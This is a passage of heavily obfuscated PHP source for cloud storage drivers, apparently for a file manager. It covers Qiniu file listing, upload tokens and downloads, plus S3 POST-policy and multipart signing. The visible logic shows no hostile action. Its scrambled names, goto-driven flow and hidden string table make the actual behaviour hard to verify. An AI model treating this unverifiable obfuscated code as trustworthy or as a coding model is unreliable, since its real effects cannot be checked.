$this->renameObject($a‹š¸º­ß¢, $fË™Ë’²¿); } public function fileInfo($c‰‘¿¤µëï, $aÄ—¾Ğî = false, $F¦šºÖÚ = array()) { goto CŸù¥Éåê; CŸù¥Éåê: $fóŠˆğ‚‚ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($aÄ—¾Ğî) { return array($fóŠˆğ‚‚[28] => $this->pathThis($c‰‘¿¤µëï), $fóŠˆğ‚‚[75] => $this->getPathOuter($fóŠˆğ‚‚[8] . $c‰‘¿¤µëï), $fóŠˆğ‚‚[29] => $fóŠˆğ‚‚[167], $fóŠˆğ‚‚[77] => isset($F¦šºÖÚ[$fóŠˆğ‚‚[1222]]) ? $F¦šºÖÚ[$fóŠˆğ‚‚[1222]] : 0, $fóŠˆğ‚‚[160] => $this->ext($c‰‘¿¤µëï)); } $E“ŒÑÁ‹íê = array($fóŠˆğ‚‚[28] => $this->pathThis($c‰‘¿¤µëï), $fóŠˆğ‚‚[75] => $this->getPathOuter($fóŠˆğ‚‚[8] . $c‰‘¿¤µëï), $fóŠˆğ‚‚[29] => $fóŠˆğ‚‚[167], $fóŠˆğ‚‚[187] => 0, $fóŠˆğ‚‚[107] => 0, $fóŠˆğ‚‚[77] => 0, $fóŠˆğ‚‚[160] => $this->ext($c‰‘¿¤µëï), $fóŠˆğ‚‚[188] => !0, $fóŠˆğ‚‚[189] => !0); goto dø“Â‹È; dø“Â‹È: if (empty($F¦šºÖÚ)) { $F¦šºÖÚ = $this->objectMeta($c‰‘¿¤µëï); if (!$F¦šºÖÚ) { return $E“ŒÑÁ‹íê; } } if (isset($F¦šºÖÚ[$fóŠˆğ‚‚[1223]])) { $E“ŒÑÁ‹íê[$fóŠˆğ‚‚[107]] = substr($F¦šºÖÚ[$fóŠˆğ‚‚[1223]] . $fóŠˆğ‚‚[33], 0, 10); } if (isset($F¦šºÖÚ[$fóŠˆğ‚‚[1222]])) { $E“ŒÑÁ‹íê[$fóŠˆğ‚‚[77]] = $F¦šºÖÚ[$fóŠˆğ‚‚[1222]]; } goto cæÛã»ç÷ã; cæÛã»ç÷ã: return $E“ŒÑÁ‹íê; goto c… Éîšİ; c… Éîšİ: } public function folderInfo($A­Ÿ“ƒÔ·¸, $e‰“ØªÚÂÚ = false) { goto Dˆ„×æ·“ä; DÃœÏØÁˆà: $A­Ÿ“ƒÔ·¸ = rtrim($A­Ÿ“ƒÔ·¸, $F“•—Ù­š[8]) . $F“•—Ù­š[8]; $c¦É¥Æò°ò = $this->objectMeta($A­Ÿ“ƒÔ·¸); if (isset($c¦É¥Æò°ò[$F“•—Ù­š[1223]])) { $F…Œåê‹£ã[$F“•—Ù­š[107]] = substr($c¦É¥Æò°ò[$F“•—Ù­š[1223]] . $F“•—Ù­š[33], 0, 10); } goto bçÁÔôÚ; Dˆ„×æ·“ä: $F“•—Ù­š =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($e‰“ØªÚÂÚ) { return array($F“•—Ù­š[28] => $this->pathThis($A­Ÿ“ƒÔ·¸), $F“•—Ù­š[75] => $this->getPathOuter($F“•—Ù­š[8] . $A­Ÿ“ƒÔ·¸), $F“•—Ù­š[29] => $F“•—Ù­š[76]); } $F…Œåê‹£ã = array($F“•—Ù­š[28] => $this->pathThis($A­Ÿ“ƒÔ·¸), $F“•—Ù­š[75] => $this->getPathOuter($F“•—Ù­š[8] . $A­Ÿ“ƒÔ·¸), $F“•—Ù­š[29] => $F“•—Ù­š[76], $F“•—Ù­š[187] => 0, $F“•—Ù­š[107] => 0, $F“•—Ù­š[1168] => !0, $F“•—Ù­š[1169] => !0); goto DÃœÏØÁˆà; bçÁÔôÚ: return $F…Œåê‹£ã; goto dê‘¶†ÇŒ; dê‘¶†ÇŒ: } public function listPath($AàÃ†Éöãö, $EÅÌ‰”­å¯ = false) { goto BâãÕ°¢—; C´âÕÑìó: $DÌòÆÒè¢ = $d¯ëˆƒ™…Ç = array(); while (!0) { list($B¡ô©ÖÙ½·, $b‘“ œì™Ğ) = $this->bucketManager->listFiles($this->bucket, $fÈÖ©†Ö”, $Fæƒ†ß‰Ë˜, $eˆİ²¥¡Ìƒ, $Eõ„²˜—Ãğ); if ($b‘“ œì™Ğ) { return !1; } $Fæƒ†ß‰Ë˜ = array_key_exists($DøÌÆ‹½[1189], $B¡ô©ÖÙ½·) ? $Fæƒ†ß‰Ë˜ = $B¡ô©ÖÙ½·[$DøÌÆ‹½[1220]] : $DøÌÆ‹½[33]; if (isset($B¡ô©ÖÙ½·[$DøÌÆ‹½[1224]])) { foreach ($B¡ô©ÖÙ½·[$DøÌÆ‹½[1224]] as $A¶áæÂ¿˜) { if ($A¶áæÂ¿˜ == $fÈÖ©†Ö”) { continue; } $DÌòÆÒè¢[] = $this->folderInfo($A¶áæÂ¿˜, $EÅÌ‰”­å¯); } } if (isset($B¡ô©ÖÙ½·[$DøÌÆ‹½[1221]])) { foreach ($B¡ô©ÖÙ½·[$DøÌÆ‹½[1221]] as $B’¿×ÈÉÀ) { if ($B’¿×ÈÉÀ[$DøÌÆ‹½[89]] == $fÈÖ©†Ö”) { continue; } $d¯ëˆƒ™…Ç[] = $this->fileInfo($B’¿×ÈÉÀ[$DøÌÆ‹½[89]], $EÅÌ‰”­å¯, $B’¿×ÈÉÀ); } } if ($Fæƒ†ß‰Ë˜ == $DøÌÆ‹½[33]) { break; } } return array($DøÌÆ‹½[74] => $DÌòÆÒè¢, $DøÌÆ‹½[73] => $d¯ëˆƒ™…Ç); goto aºŒ±‚„á¥; FÓÍÓÂßƒÕ: $Fæƒ†ß‰Ë˜ = $DøÌÆ‹½[33]; $eˆİ²¥¡Ìƒ = 1000; $Eõ„²˜—Ãğ = $DøÌÆ‹½[8]; goto C´âÕÑìó; BâãÕ°¢—: $DøÌÆ‹½ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AàÃ†Éöãö = trim($AàÃ†Éöãö, $DøÌÆ‹½[8]); $fÈÖ©†Ö” = empty($AàÃ†Éöãö) ? $DøÌÆ‹½[33] : $AàÃ†Éöãö . $DøÌÆ‹½[8]; goto FÓÍÓÂßƒÕ; aºŒ±‚„á¥: } public function has($C‘¬õ“é½, $CºÒ‚Ç™ôà = false, $BÄó³¬ùçÚ = true) { goto fëÑïˆ¥Šà; fëÑïˆ¥Šà: $cÕ––Ôçôï =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C‘¬õ“é½ = trim($C‘¬õ“é½, $cÕ––Ôçôï[8]); $aß½ÑÖ®®ë = empty($C‘¬õ“é½) ? $cÕ––Ôçôï[33] : $C‘¬õ“é½ . $cÕ––Ôçôï[8]; goto f¯ã¹À†ä±; f¯ã¹À†ä±: $C„ÊŸÆò¥Í = $cÕ––Ôçôï[33]; $E¢†ŸÄ»à° = 1000; $d•ÇÓÄ¨áô = $cÕ––Ôçôï[8]; goto E´Æåß…; DÕ†á®õŞ: if ($CºÒ‚Ç™ôà) { return array($cÕ––Ôçôï[191] => $d»²òÓËèŞ, $cÕ––Ôçôï[192] => $DšîÎ¼ÈÊ¥); } return !1; goto bõçå´àÉŞ; E´Æåß…: $d»²òÓËèŞ = 0; $DšîÎ¼ÈÊ¥ = 0; while (!0) { list($e§’İ½Æ—ğ, $EÎ…­§Ëˆ¬) = $this->bucketManager->listFiles($this->bucket, $aß½ÑÖ®®ë, $C„ÊŸÆò¥Í, $E¢†ŸÄ»à°, $d•ÇÓÄ¨áô); if ($EÎ…­§Ëˆ¬) { return !1; } $C„ÊŸÆò¥Í = array_key_exists($cÕ––Ôçôï[1189], $e§’İ½Æ—ğ) ? $C„ÊŸÆò¥Í = $e§’İ½Æ—ğ[$cÕ––Ôçôï[1220]] : $cÕ––Ôçôï[33]; if ($CºÒ‚Ç™ôà) { if (!empty($e§’İ½Æ—ğ[$cÕ––Ôçôï[1221]])) { $d»²òÓËèŞ += count($e§’İ½Æ—ğ[$cÕ––Ôçôï[1221]]); } if (!empty($e§’İ½Æ—ğ[$cÕ––Ôçôï[1224]])) { $DšîÎ¼ÈÊ¥ += count($e§’İ½Æ—ğ[$cÕ––Ôçôï[1224]]); } if ($C„ÊŸÆò¥Í === $cÕ––Ôçôï[33]) { break; } continue; } if ($BÄó³¬ùçÚ) { if (!empty($e§’İ½Æ—ğ[$cÕ––Ôçôï[1221]])) { return !0; } } else { if (!empty($e§’İ½Æ—ğ[$cÕ––Ôçôï[1224]])) { return !0; } } if ($C„ÊŸÆò¥Í == $cÕ––Ôçôï[33]) { break; } } goto DÕ†á®õŞ; bõçå´àÉŞ: } public function listAll($bÆ×¨¯Ä„¨) { $a–ìõÖ½å =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fÏ÷¸ÈÃÆ = $this->fileList($bÆ×¨¯Ä„¨, 1); $Dùêòµƒ´… = array(); foreach ($fÏ÷¸ÈÃÆ as $b£†×ò©ïí) { $Dùêòµƒ´…[$b£†×ò©ïí[$a–ìõÖ½å[28]]] = $b£†×ò©ïí[$a–ìõÖ½å[77]]; } return $this->listAllFiles($bÆ×¨¯Ä„¨, array_keys($Dùêòµƒ´…), $Dùêòµƒ´…); } public function canRead($B’‰â…‰¿Â) { return $this->exist($B’‰â…‰¿Â) ? !0 : !1; } public function canWrite($D²«ç†ïŠ) { return $this->exist($D²«ç†ïŠ) ? !0 : !1; } public function getContent($DÚÂî’Å ¹) { return $this->fileSubstr($DÚÂî’Å ¹, 0, -1); } public function setContent($C½‰–ğôº, $fËâ»Åİ¯ = '') { $aØ‰„µÎ© = $this->tempFile($this->pathThis($C½‰–ğôº)); file_put_contents($aØ‰„µÎ©, $fËâ»Åİ¯); if ($this->upload($C½‰–ğôº, $aØ‰„µÎ©)) { $this->tempFileRemve($aØ‰„µÎ©); return !0; } return !1; } public function refreshUrls($d¬ƒ‡æ‡«Ü) { goto FËàÃì»…²; få¨ÍÀ’£: return $FèõñÑéÙî[$e“½ÖÜùğ[1225]] == $e“½ÖÜùğ[699] ? !0 : !1; goto A– á˜íğµ; FŸÚŒÈ¦Ñ¬: $e˜†ĞáÁØï = new Qiniu\Cdn\CdnManager($this->auth); list($FèõñÑéÙî, $Aö½Ú’ƒõ) = $e˜†ĞáÁØï->refreshUrls($Fíòë ¥æÜ); if ($Aö½Ú’ƒõ) { return !1; } goto få¨ÍÀ’£; FËàÃì»…²: $e“½ÖÜùğ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Fíòë ¥æÜ = array(); if (is_array($d¬ƒ‡æ‡«Ü)) { foreach ($d¬ƒ‡æ‡«Ü as $Fà—«å“§Ø) { $Fíòë ¥æÜ[] = $this->link($Fà—«å“§Ø); } } else { $Fíòë ¥æÜ[] = $this->link($d¬ƒ‡æ‡«Ü); } goto FŸÚŒÈ¦Ñ¬; A– á˜íğµ: } public function fileSubstr($A¤´¡Ü‚Öš, $E¼¨Â£¦†Ç, $eÒ»ß…»Óì) { $d¤å“ã¥Õ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!($c®…±¬µ†  = $this->link($A¤´¡Ü‚Öš))) { return !1; } $FÕ—¸ˆ–×Ñ = !1; if ($eÒ»ß…»Óì > 0) { $Aä‡‚È±İ† = $E¼¨Â£¦†Ç + $eÒ»ß…»Óì - 1; $FÕ—¸ˆ–×Ñ = array($d¤å“ã¥Õ[1226] . $E¼¨Â£¦†Ç . $d¤å“ã¥Õ[412] . $Aä‡‚È±İ†); } $FéÔ¼“Ê = url_request($c®…±¬µ† , $d¤å“ã¥Õ[216], !1, $FÕ—¸ˆ–×Ñ); return $FéÔ¼“Ê[$d¤å“ã¥Õ[692]] ? $FéÔ¼“Ê[$d¤å“ã¥Õ[1038]] : !1; } public function upload($E‡Åå–Š´, $f¦¸¸­¨, $d‚ÖÓ÷×É = false, $eëîç“Øµ = REPEAT_REPLACE) { $cßŠÚ ó¼‹ = new Qiniu\Storage\UploadManager(); $Fº²òœ·¡ = $this->auth->uploadToken($this->bucket, $E‡Åå–Š´); $FÉº†Å‚àè = get_file_mime(get_path_ext($f¦¸¸­¨)); list($C†œÑÉ‰«¸, $f¢ŸÆÃ‡ñ­) = $cßŠÚ ó¼‹->putFile($Fº²òœ·¡, $E‡Åå–Š´, $f¦¸¸­¨, null, $FÉº†Å‚àè); return $f¢ŸÆÃ‡ñ­ ? !1 : $this->getPathOuter($E‡Åå–Š´); } public function uploadFormData($A‡õ–İ„ó™, $CÜš¿¹³Çø = 3600) { return $this->uploadToken($A‡õ–İ„ó™, $CÜš¿¹³Çø); } public function multiUploadFormData($Cíğ‡½‰Ã›, $D¡ŒâÁ·ô… = 3600) { return $this->uploadToken($Cíğ‡½‰Ã›, $D¡ŒâÁ·ô…); } private function uploadToken($A‘ßƒã‘İ, $dˆ„³ËçÒ = 3600) { goto Cù¶µ÷êºŸ; BÔ™‡ãà¤§: $Aƒ’ŒÜø¦„ = null; $D¥§âø‘ = $this->auth->uploadToken($this->bucket, $Aƒ’ŒÜø¦„, $bƒèÔ¼â’Â, $b±ÒŠç…À­, !0); $D–‘ôÂâ•» = empty($this->region) || $this->region == $Cè½»Èé…¹[1229] ? $Cè½»Èé…¹[33] : $Cè½»Èé…¹[412] . $this->region; goto B®ä“Á¥çÒ; B®ä“Á¥çÒ: $EÛ´¦ƒª’ = http_type() . "\72\57\x2f\165\160\x6c\157\x61\144{$D–‘ôÂâ•»}\56\161\x69\x6e\x69\165\x70\56\x63\x6f\155\57"; return array($Cè½»Èé…¹[1230] => $D¥§âø‘, $Cè½»Èé…¹[1231] => $EÛ´¦ƒª’); goto F«ÁÂ‡Ş¶•; Cù¶µ÷êºŸ: $Cè½»Èé…¹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bƒèÔ¼â’Â = $dˆ„³ËçÒ; $b±ÒŠç…À­ = array($Cè½»Èé…¹[1227] => $Cè½»Èé…¹[1228]); goto BÔ™‡ãà¤§; F«ÁÂ‡Ş¶•: } public function download($C—Áí„‰ï¿, $dˆ“É–‡ÑÔ) { goto CÏÊ†à™ò; cÓ™†ôß¿¼: fclose($DÚğô¿ó¬); return $dˆ“É–‡ÑÔ; goto E«´¿ïØÍä; FâÈ…¯Äî: $f‡æƒ«éİ = 1024 * 200; $DÚğô¿ó¬ = fopen($CçÒîÑ•æ», $_SERVER[³‘’¼äÑ™ÔÍ][1232]); while (!0) { $D½ö¦ğ”èí = $this->fileSubstr($C—Áí„‰ï¿, $Cø¢¥¿­ÕŒ, $f‡æƒ«éİ); if ($D½ö¦ğ”èí === !1) { return !1; } fwrite($DÚğô¿ó¬, $D½ö¦ğ”èí); $Cø¢¥¿­ÕŒ += $f‡æƒ«éİ; if (strlen($D½ö¦ğ”èí) < $f‡æƒ«éİ) { break; } } goto cÓ™†ôß¿¼; CÏÊ†à™ò: $CçÒîÑ•æ» = IO::getPathInner(IO::mkfile($dˆ“É–‡ÑÔ)); if (!($f—¹¢¹”Ïæ = $this->link($C—Áí„‰ï¿))) { return !1; } $Cø¢¥¿­ÕŒ = 0; goto FâÈ…¯Äî; E«´¿ïØÍä: } public function link($F„ğÊÊ®Ù‡, $a‹ó¿øê´† = '') { if (!$this->isFile($F„ğÊÊ®Ù‡)) { return !1; } $dºÙ„Ä“à½ = $this->getHost() . $_SERVER[³‘’¼äÑ™ÔÍ][8] . $this->pathEncode($F„ğÊÊ®Ù‡) . $a‹ó¿øê´†; return $this->auth->privateDownloadUrl($dºÙ„Ä“à½, 3600 * 12); } public function fileOut($F¸ÑĞì‚ğ, $aÙ°¾´½ƒÜ = false, $C– ¬æÄÌ¶ = false, $f¸„¢Ÿä¥ø = '') { $fá°ç“«”‚ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$C– ¬æÄÌ¶) { $C– ¬æÄÌ¶ = $this->pathThis($F¸ÑĞì‚ğ); } $BíÂóå¢‘İ = $aÙ°¾´½ƒÜ ? $fá°ç“«”‚[1233] . rawurlencode($C– ¬æÄÌ¶) : $fá°ç“«”‚[33]; $BÉê’˜È¢ë = $this->link($F¸ÑĞì‚ğ, $BíÂóå¢‘İ); $this->fileOutLink($BÉê’˜È¢ë); } public function fileOutServer($CäÑªœ‹ã†, $cÆÈ¥±çÙÖ = false, $FÕ×ÆØ¼™² = false, $Fç«ê­”ôÅ = '') { parent::fileOut($CäÑªœ‹ã†, $cÆÈ¥±çÙÖ, $FÕ×ÆØ¼™², $Fç«ê­”ôÅ); } public function fileOutImage($EÏÏÕÁ‡Â¸, $fàê­˜›×˜ = 250) { $EòğÊš¦Ì¤ = $this->link($EÏÏÕÁ‡Â¸, $_SERVER[³‘’¼äÑ™ÔÍ][1234] . $fàê­˜›×˜); $this->fileOutLink($EòğÊš¦Ì¤); } public function fileOutImageServer($CùÀÇãÖ¶’, $F„÷ùÅ–¸ = 250) { parent::fileOutImage($CùÀÇãÖ¶’, $F„÷ùÅ–¸); } public function hashMd5($F®Ùğ…å‚«) { $E¥÷ãÆŠºÄ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $CçÅÅÔš‹ = $this->objectMeta($F®Ùğ…å‚«); return isset($CçÅÅÔš‹[$E¥÷ãÆŠºÄ[196]]) ? $CçÅÅÔš‹[$E¥÷ãÆŠºÄ[196]] : !1; $c¼–Ô§¸æĞ = $this->link($F®Ùğ…å‚«, $E¥÷ãÆŠºÄ[1235]); } public function size($CñÓÛÛİÇÔ) { $F•ÛàØ³†Ñ = $this->objectMeta($CñÓÛÛİÇÔ); return $F•ÛàØ³†Ñ ? $F•ÛàØ³†Ñ[$_SERVER[³‘’¼äÑ™ÔÍ][77]] : 0; } public function info($Bêœù®”ƒ‘) { if ($this->isFolder($Bêœù®”ƒ‘)) { return $this->folderInfo($Bêœù®”ƒ‘); } else { if ($this->isFile($Bêœù®”ƒ‘)) { return $this->fileInfo($Bêœù®”ƒ‘); } } return !1; } public function exist($cŒ”ğÁ…ïš) { return $this->isFile($cŒ”ğÁ…ïš) || $this->isFolder($cŒ”ğÁ…ïš); } public function isFile($b£šİ–Ÿ‚) { return !$this->isFolder($b£šİ–Ÿ‚) && $this->objectMeta($b£šİ–Ÿ‚); } public function isFolder($eƒŒì¯¼¨) { return $this->cacheMethod($_SERVER[³‘’¼äÑ™ÔÍ][223], $eƒŒì¯¼¨); } protected function objectMeta($AÖí¥©ÎêÉ) { return $this->cacheMethod($_SERVER[³‘’¼äÑ™ÔÍ][224], $AÖí¥©ÎêÉ); } protected function _objectMeta($CÎ³¼í©ë) { $fª ô«†Ø =& $_SERVER[³‘’¼äÑ™ÔÍ]; list($cÕ¦œ¼–ò¹, $b½ğÜÜÆ±Ë) = $this->bucketManager->stat($this->bucket, $CÎ³¼í©ë); if ($cÕ¦œ¼–ò¹) { $cÕ¦œ¼–ò¹[$fª ô«†Ø[77]] = intval($cÕ¦œ¼–ò¹[$fª ô«†Ø[1222]]); } return $cÕ¦œ¼–ò¹; } protected function _isFolder($CÃ¸õ‰İò¶) { $E¨Û¬ï Íô =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($CÃ¸õ‰İò¶ == $E¨Û¬ï Íô[33] || $CÃ¸õ‰İò¶ == $E¨Û¬ï Íô[8]) { return !0; } list($DŒ…ÎÀæ”µ, $C˜˜‘¢çóÀ) = $this->bucketManager->listFiles($this->bucket, trim($CÃ¸õ‰İò¶, $E¨Û¬ï Íô[8]) . $E¨Û¬ï Íô[8], $E¨Û¬ï Íô[33], 1, $E¨Û¬ï Íô[8]); return !empty($DŒ…ÎÀæ”µ[$E¨Û¬ï Íô[1221]]) || !empty($DŒ…ÎÀæ”µ[$E¨Û¬ï Íô[1224]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($D‚Œ Éà’œ) { parent::__construct($D‚Œ Éà’œ); } public function uploadFormData($bÇÓ…“ÑµÌ, $Bğ°°²´ = 3600) { goto BÅ¡ÃÛœ»º; CÜãëºÚ×: $aËšĞ¤„àí = array($cö¿ÍÈĞÆ[199] => $cö¿ÍÈĞÆ[33], $cö¿ÍÈĞÆ[1152] => $cö¿ÍÈĞÆ[33], $cö¿ÍÈĞÆ[1108] => $BØƒ‡‘¿ŒÂ, $cö¿ÍÈĞÆ[1112] => $eÉÈÉìŸëà, $cö¿ÍÈĞÆ[1116] => $b¿Â‹‡Ğç›, $cö¿ÍÈĞÆ[1153] => $CÊÛ–¦±¼­, $cö¿ÍÈĞÆ[1154] => $EÎÌÈË¸, $cö¿ÍÈĞÆ[1155] => $bƒ¿ªÛò…ä, $cö¿ÍÈĞÆ[1156] => $F…­·¡’ƒÇ, $cö¿ÍÈĞÆ[1157] => $A—‚¦Àß‚, $cö¿ÍÈĞÆ[169] => $this->getHost()); return $aËšĞ¤„àí; goto DÍ”†³‹±¬; b’ôºÜé: $bÁ¿½Ï„‹ = hash_hmac($cö¿ÍÈĞÆ[1150], $BÆÅ³ß«„ˆ, $c•ôÀ–¬â, !0); $d¸‰ä¬®åš = hash_hmac($cö¿ÍÈĞÆ[1150], $cîß¼¡èˆô, $bÁ¿½Ï„‹, !0); $A—‚¦Àß‚ = hash_hmac($cö¿ÍÈĞÆ[1150], $b¿Â‹‡Ğç›, $d¸‰ä¬®åš); goto CÜãëºÚ×; e™–à©¥ŞÊ: $CÅ–ŸìŠÙ = array($this->accessKey, $f‡É…¿Ø‚Ô, $this->region, $BÆÅ³ß«„ˆ, $cîß¼¡èˆô); $CÊÛ–¦±¼­ = implode($cö¿ÍÈĞÆ[8], $CÅ–ŸìŠÙ); $còã»¶Ç = array($cö¿ÍÈĞÆ[1106] => gmdate($cö¿ÍÈĞÆ[1105], strtotime($cö¿ÍÈĞÆ[1143])), $cö¿ÍÈĞÆ[1107] => array(array($cö¿ÍÈĞÆ[1109] => $this->bucket), array($cö¿ÍÈĞÆ[1108] => $BØƒ‡‘¿ŒÂ), array($cö¿ÍÈĞÆ[1110], $cö¿ÍÈĞÆ[1111], $cö¿ÍÈĞÆ[33]), array($cö¿ÍÈĞÆ[1110], $cö¿ÍÈĞÆ[1144], $cö¿ÍÈĞÆ[33]), array($cö¿ÍÈĞÆ[1110], $cö¿ÍÈĞÆ[1145], $cö¿ÍÈĞÆ[33]), array($cö¿ÍÈĞÆ[1112] => $eÉÈÉìŸëà), array($cö¿ÍÈĞÆ[1146] => $CÊÛ–¦±¼­), array($cö¿ÍÈĞÆ[1147] => $EÎÌÈË¸), array($cö¿ÍÈĞÆ[1148] => $bƒ¿ªÛò…ä), array($cö¿ÍÈĞÆ[1149] => $F…­·¡’ƒÇ))); goto FÍóË‚ªƒö; FÍóË‚ªƒö: $b¿Â‹‡Ğç› = base64_encode(json_encode($còã»¶Ç)); $c¨¥™Ä¿Úœ = hash_hmac($cö¿ÍÈĞÆ[1150], $f‡É…¿Ø‚Ô, $cö¿ÍÈĞÆ[1151] . $this->secret, !0); $c•ôÀ–¬â = hash_hmac($cö¿ÍÈĞÆ[1150], $this->region, $c¨¥™Ä¿Úœ, !0); goto b’ôºÜé; cêÇ†©ïÅî: $cîß¼¡èˆô = $cö¿ÍÈĞÆ[1142]; $F…­·¡’ƒÇ = $Bğ°°²´ . $cö¿ÍÈĞÆ[33]; $eÉÈÉìŸëà = $cö¿ÍÈĞÆ[1104]; goto e™–à©¥ŞÊ; BÅ¡ÃÛœ»º: $cö¿ÍÈĞÆ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $BØƒ‡‘¿ŒÂ = $cö¿ÍÈĞÆ[185]; $EÎÌÈË¸ = $cö¿ÍÈĞÆ[1140]; goto FÖˆµ¥£´È; FÖˆµ¥£´È: $BÆÅ³ß«„ˆ = $cö¿ÍÈĞÆ[59]; $bƒ¿ªÛò…ä = gmdate($cö¿ÍÈĞÆ[1141]); $f‡É…¿Ø‚Ô = gmdate($cö¿ÍÈĞÆ[693]); goto cêÇ†©ïÅî; DÍ”†³‹±¬: } public function multiUploadFormData($e± ‡µñä¸, $C°È±Œí¤ = 3600) { $F«õºÛØ÷‰ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b©‰­î¾øÜ = gmdate($F«õºÛØ÷‰[1236]); $eµæÁĞ¡Ö = array(); $añ”ĞÓß§¶ = $this->client->getUploadId($this->bucket, $e± ‡µñä¸, $eµæÁĞ¡Ö); if (!$añ”ĞÓß§¶) { return !1; } return array($F«õºÛØ÷‰[209] => $añ”ĞÓß§¶, $F«õºÛØ÷‰[169] => $this->getHost() . $F«õºÛØ÷‰[8] . $this->pathEncode($e± ‡µñä¸), $F«õºÛØ÷‰[210] => $b©‰­î¾øÜ, $F«õºÛØ÷‰[89] => $e± ‡µñä¸); } public function multiUploadAuthData($d„öŒóë, $eéÔçƒÏ = array()) { goto e«¯‰“Í­; f±´Œ÷¸Šï: $cÈÚ–°èÅå = $eÑµíç”é[214]; $a£¡éé‡ñ = $eÑµíç”é[8] . $this->pathEncode($f°“Å¸š„¸) . $E×šŸÖé§á; $FĞõùô© = $this->client->__getSignatureV4($dÇ¯îè‡ôø, $CÙ™©Ê‘Ã¶, $cÈÚ–°èÅå, $a£¡éé‡ñ); goto cÌº©Š®¦; BÍ•™©“©: unset($eéÔçƒÏ[$eÑµíç”é[89]]); if (isset($eéÔçƒÏ[$eÑµíç”é[211]])) { return $this->listUploadParts($f°“Å¸š„¸, $eéÔçƒÏ); } $dÇ¯îè‡ôø = array(); goto Dƒ¼†À‹»; e«¯‰“Í­: $eÑµíç”é =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E×šŸÖé§á = isset($eéÔçƒÏ[$eÑµíç”é[160]]) ? $eéÔçƒÏ[$eÑµíç”é[160]] : $eÑµíç”é[33]; $f°“Å¸š„¸ = $eéÔçƒÏ[$eÑµíç”é[89]]; goto BÍ•™©“©; cÌº©Š®¦: if (strpos($E×šŸÖé§á, $eÑµíç”é[213]) === 0) { if (isset($dÇ¯îè‡ôø[$eÑµíç”é[1238]])) { $Eµµ°Ô¥¼ç = $dÇ¯îè‡ôø[$eÑµíç”é[1238]]; } else { if (isset($FĞõùô©[$eÑµíç”é[1238]])) { $Eµµ°Ô¥¼ç = $FĞõùô©[$eÑµíç”é[1238]]; } else { $Eµµ°Ô¥¼ç = hash($eÑµíç”é[1150], $eÑµíç”é[33]); } } return array($eÑµíç”é[220] => $FĞõùô©[$eÑµíç”é[220]], $eÑµíç”é[1238] => $Eµµ°Ô¥¼ç, $eÑµíç”é[210] => $FĞõùô©[$eÑµíç”é[1241]]); } return $FĞõùô©[$eÑµíç”é[220]]; goto C´†‚ÂóØ¨; Dƒ¼†À‹»: if (isset($eéÔçƒÏ[$eÑµíç”é[1237]])) { $dÇ¯îè‡ôø[$eÑµíç”é[1238]] = $eéÔçƒÏ[$eÑµíç”é[1237]]; } $E¶¥Ù‡¼ô  = explode($eÑµíç”é[171], $this->getHost()); $CÙ™©Ê‘Ã¶ = array($eÑµíç”é[1239] => $E¶¥Ù‡¼ô [1], $eÑµíç”é[1240] => $eÑµíç”é[33], $eÑµíç”é[199] => $eÑµíç”é[116], $eÑµíç”é[1152] => $eéÔçƒÏ[$eÑµíç”é[77]]); goto f±´Œ÷¸Šï; C´†‚ÂóØ¨: } public function listUploadParts($c†¨¸Üœğõ, $fÇ‚ãç—‡Û = array()) { goto c°¤õÁÙ¿™; FĞ´ñ­­®ì: $AŠÅù“ê = array($Cóæô¿İŸÅ[1239] => $AÑ¥‚¾¤ŒÜ[1], $Cóæô¿İŸÅ[199] => $Cóæô¿İŸÅ[116], $Cóæô¿İŸÅ[1152] => strlen($aŸàöå¥ò)); $f÷‡¿»ìÈ¨ = $Cóæô¿İŸÅ[212]; $Dªìºí•ğ = $Cóæô¿İŸÅ[8] . $this->pathEncode($c†¨¸Üœğõ) . $fÇ‚ãç—‡Û[$Cóæô¿İŸÅ[160]]; goto eËÛĞ£­˜‚; D—¸Ç“ˆĞŠ: if (!$D´è­ÌñÙ») { return !1; } $aŸàöå¥ò = $Cóæô¿İŸÅ[1242]; foreach ($D´è­ÌñÙ» as $FØ‘İœŒêç) { $aŸàöå¥ò .= $Cóæô¿İŸÅ[1243] . "\x3c\x50\141\x72\x74\x4e\165\x6d\142\x65\x72\x3e{$FØ‘İœŒêç[$Cóæô¿İŸÅ[1194]]}\74\x2f\x50\x61\x72\164\116\165\x6d\x62\145\162\x3e\xa" . "\74\x45\124\141\x67\x3e{$FØ‘İœŒêç[$Cóæô¿İŸÅ[1195]]}\x3c\57\105\x54\x61\x67\76\xa" . $Cóæô¿İŸÅ[1244]; } goto Cå•Íªñª¡; Cå•Íªñª¡: $aŸàöå¥ò .= $Cóæô¿İŸÅ[1245]; $c¶¥Ôøó„® = array(); $AÑ¥‚¾¤ŒÜ = explode($Cóæô¿İŸÅ[171], $this->getHost()); goto FĞ´ñ­­®ì; c°¤õÁÙ¿™: $Cóæô¿İŸÅ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $F¦è…­Æœ¢ = str_replace($Cóæô¿İŸÅ[221], $Cóæô¿İŸÅ[33], $fÇ‚ãç—‡Û[$Cóæô¿İŸÅ[160]]); $D´è­ÌñÙ» = $this->client->listParts($this->bucket, $c†¨¸Üœğõ, $F¦è…­Æœ¢); goto D—¸Ç“ˆĞŠ; eËÛĞ£­˜‚: $fŒô–ª†• = $this->client->__getSignatureV4($c¶¥Ôøó„®, $AŠÅù“ê, $f÷‡¿»ìÈ¨, $Dªìºí•ğ, $aŸàöå¥ò); return array($Cóæô¿İŸÅ[220] => $fŒô–ª†•[$Cóæô¿İŸÅ[220]], $Cóæô¿İŸÅ[210] => $fŒô–ª†•[$Cóæô¿İŸÅ[1241]], $Cóæô¿İŸÅ[222] => $D´è­ÌñÙ», $Cóæô¿İŸÅ[1238] => $fŒô–ª†•[$Cóæô¿İŸÅ[1238]]); goto dáÒ¡ÅÓá‹; 